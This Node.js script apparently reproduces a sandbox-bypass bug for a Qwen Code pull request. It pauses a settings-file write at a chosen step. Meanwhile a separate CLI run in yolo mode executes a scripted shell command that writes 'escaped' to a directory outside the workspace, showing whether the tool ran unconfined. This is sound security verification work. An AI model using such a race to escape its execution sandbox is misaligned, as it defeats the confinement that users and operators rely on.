// Terminal transcript for the screenshot: pause the REAL writer at a chosen
// checkpoint, then run real commands and print their real output.
import { spawn, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
const [arm, stopAtArg] = process.argv.slice(2);
const stopAt = Number(stopAtArg);
const ROOT = '/root/verify/pr13119', CLI = `${ROOT}/${arm}/dist/cli.js`, NS = `${ROOT}/bwrap-private/ns.sh`;
const QH = `${ROOT}/run/qh`, WS = `${ROOT}/run/ws`, TARGET = `${QH}/settings.json`, CTL = `${ROOT}/run/ctl-demo-${arm}`;
const OUT = `${ROOT}/outside/demo-${arm}.txt`;
const MODEL = ['--auth-type', 'openai', '--openai-api-key', 'dummy', '--openai-base-url', 'http://127.0.0.1:18719/v1', '--model', 'dummy'];
const env = { ...process.env };
for (const k of ['HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy', 'ALL_PROXY', 'all_proxy', 'NO_PROXY', 'no_proxy', 'NO_COLOR', 'NODE_OPTIONS']) delete env[k];
Object.assign(env, { HOME: `${ROOT}/run/home`, QWEN_HOME: QH, QWEN_CODE_SYSTEM_SETTINGS_PATH: '/nonexistent/system-settings.json', QWEN_CODE_SYSTEM_DEFAULTS_PATH: '/nonexistent/system-defaults.json', QWEN_CODE_NO_RELAUNCH: '1', QWEN_SANDBOX: 'false' });
const C = { p: '\x1b[1;32m', c: '\x1b[1;36m', d: '\x1b[2m', r: '\x1b[1;31m', g: '\x1b[1;32m', y: '\x1b[1;33m', x: '\x1b[0m' };
const lines = [];
const say = (s = '') => lines.push(s);
const cmd = (s) => say(`${C.p}$${C.x} ${s}`);
const short = (s) => s.replaceAll(QH, '$QWEN_HOME').replaceAll(`${ROOT}/outside`, '/outside').replaceAll(WS, '$WS');

fs.rmSync(CTL, { recursive: true, force: true }); fs.mkdirSync(CTL, { recursive: true });
for (const n of fs.readdirSync(QH)) if (n.startsWith('settings.json')) fs.rmSync(path.join(QH, n), { recursive: true, force: true });
fs.copyFileSync(`${ROOT}/run/settings.initial.json`, TARGET);
fs.rmSync(OUT, { force: true });

say(`${C.y}# ${arm === 'base' ? 'BASE 78143fe335 (before PR)' : 'PR HEAD d0be922868'} — Linux, real bwrap, real bundled CLI${C.x}`);
say(`${C.d}# user settings hold tools.executionSandbox = workspace-write / network closed${C.x}`);
say(`${C.d}# /outside = ${ROOT}/outside, a host directory outside the workspace $WS${C.x}`);
say(`${C.d}# terminal A saves an unrelated setting; the writer is paused after fs step #${stopAt}${C.x}`);
cmd(`qwen -p "/language ui en" &   ${C.d}# terminal A (real writer)${C.x}`);
const writer = spawn(NS, ['node', CLI, ...MODEL, '-p', '/language ui en'], { cwd: WS, env: { ...env, NODE_OPTIONS: `--require ${ROOT}/harness/pause-hook.cjs`, PAUSE_TARGET: TARGET, PAUSE_CTL: CTL } });
let wout = ''; writer.stdout.on('data', (d) => (wout += d)); writer.stderr.on('data', (d) => (wout += d));
let exited = false; writer.on('close', () => (exited = true));
for (let n = 1; ; n++) {
  const ck = path.join(CTL, `ckpt-${n}.json`);
  while (!fs.existsSync(ck)) await new Promise((r) => setTimeout(r, 20));
  await new Promise((r) => setTimeout(r, 30));
  const d = JSON.parse(fs.readFileSync(ck, 'utf8'));
  say(`${C.d}  [writer step #${n}] ${d.op}(${d.args.map((a) => short(a).replace('$QWEN_HOME/', '')).join(' -> ')})${C.x}`);
  if (n === stopAt) break;
  fs.writeFileSync(path.join(CTL, `release-${n}`), '');
}
say(`${C.y}# --- writer paused here; terminal B starts independent qwen processes ---${C.x}`);
cmd('ls -A $QWEN_HOME | grep settings');
for (const n of fs.readdirSync(QH).filter((n) => n.startsWith('settings.json')).sort()) {
  const isDir = fs.statSync(path.join(QH, n)).isDirectory();
  say(isDir ? `${n}/   ${C.d}(${fs.readdirSync(path.join(QH, n)).join(', ')})${C.x}` : n);
}
if (!fs.existsSync(TARGET)) say(`${C.r}# settings.json is ABSENT${C.x}`);
cmd('qwen sandbox');
const sb = spawnSync(NS, ['node', CLI, 'sandbox'], { cwd: WS, env, encoding: 'utf8' });
for (const l of (sb.stdout + sb.stderr).trim().split('\n').slice(0, 3)) say(l.startsWith('Tool execution sandbox: none') ? `${C.r}${l}${C.x}` : l);
cmd(`qwen --approval-mode yolo -p "..."   ${C.d}# scripted model calls run_shell_command:${C.x}`);
say(`${C.d}#   echo escaped > /outside/demo-${arm}.txt; echo inside > ./inside.txt && echo WROTE_INSIDE${C.x}`);
const ag = spawnSync(NS, ['node', CLI, '--approval-mode', 'yolo', ...MODEL, '-o', 'stream-json', '-p', `RUN<<echo escaped > ${OUT}; echo inside > ./inside.txt && echo WROTE_INSIDE>>`], { cwd: WS, env, encoding: 'utf8' });
for (const line of ag.stdout.split('\n')) {
  if (!line.includes('tool_result')) continue;
  try { for (const b of JSON.parse(line).message.content) if (b.type === 'tool_result') for (const l of short(String(b.content)).split('\n')) say(`  tool_result: ${l.includes('Read-only') ? C.g + l + C.x : l}`); } catch {}
}
cmd('cat /outside/demo-' + arm + '.txt');
if (fs.existsSync(OUT)) say(`${C.r}${fs.readFileSync(OUT, 'utf8').trim()}   <- written OUTSIDE the workspace: tool ran unconfined${C.x}`);
else say(`${C.g}cat: /outside/demo-${arm}.txt: No such file or directory   <- confined${C.x}`);
for (let n = stopAt; ; n++) {
  if (exited) break;
  fs.writeFileSync(path.join(CTL, `release-${n}`), '');
  const next = path.join(CTL, `ckpt-${n + 1}.json`);
  while (!fs.existsSync(next) && !exited) await new Promise((r) => setTimeout(r, 20));
}
say(`${C.y}# --- writer released ---${C.x}`);
say(`${C.d}  [terminal A] ${wout.trim().split('\n').pop()}${C.x}`);
cmd('qwen sandbox | head -1');
const sb2 = spawnSync(NS, ['node', CLI, 'sandbox'], { cwd: WS, env, encoding: 'utf8' });
say((sb2.stdout + sb2.stderr).trim().split('\n')[0]);
fs.writeFileSync(`${ROOT}/run/demo-${arm}.ansi`, lines.join('\n') + '\n');
console.log(lines.join('\n'));
